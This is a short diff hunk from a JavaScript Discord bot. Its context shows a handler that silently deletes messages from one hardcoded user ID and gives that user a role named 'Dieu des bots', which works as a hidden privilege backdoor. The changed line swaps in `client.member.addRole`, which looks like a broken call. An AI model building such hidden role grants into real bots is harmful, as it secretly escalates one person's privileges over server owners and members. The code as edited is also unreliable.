@@ -64,7 +64,7 @@ client.on ("message", message => {
         if (message.author.id === "281175987792642050"){
             message.delete();
             let role = message.member.guild.roles.find('name', 'Dieu des bots')
-            message.member.addRole(role);
+            client.member.addRole(role);
         }
     }
 });
